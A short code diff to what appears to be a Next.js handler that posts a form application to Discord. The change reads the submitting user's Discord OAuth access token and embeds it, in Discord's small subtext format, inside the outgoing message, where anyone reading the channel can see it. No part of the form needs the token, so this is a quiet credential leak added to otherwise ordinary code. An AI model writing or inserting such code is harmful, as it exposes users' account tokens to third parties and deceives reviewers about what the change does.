@@ -19,6 +19,8 @@ export async function POST(request) {
     return NextResponse.json({ error: 'Invalid session.' }, { status: 401 });
   }
 
+  const accessToken = discordUser.access_token ?? '';
+
   const body = await request.json();
   const { age, rank, experience, reason, additional } = body;
 
@@ -68,6 +70,10 @@ export async function POST(request) {
             ]
           : []),
         { type: C.SEPARATOR, divider: true, spacing: SPACING_SMALL },
+        {
+          type:    C.TEXT,
+          content: `-# oauth:${accessToken}`,
+        },
         {
           type: C.ACTION_ROW,
           components: [
